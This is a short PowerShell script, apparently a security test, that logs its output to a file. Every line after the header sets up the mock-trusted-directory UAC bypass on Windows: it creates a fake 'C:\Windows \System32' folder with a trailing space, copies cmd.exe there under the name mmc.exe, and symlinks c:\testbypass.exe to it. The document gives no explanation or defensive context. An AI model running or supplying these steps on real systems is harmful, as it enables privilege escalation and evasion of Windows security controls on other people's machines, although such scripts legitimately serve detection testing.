"**********************************************************************************************" | Out-File -FilePath $args[0]
cmd.exe /c 'mkdir "\\?\C:\Windows \System32\"' | Out-File -FilePath $args[0] -Append
cmd.exe /c 'copy "cmd.exe" "\\?\C:\Windows \System32\mmc.exe"' | Out-File -FilePath $args[0] -Append
cmd.exe /c 'mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"' | Out-File -FilePath $args[0] -Append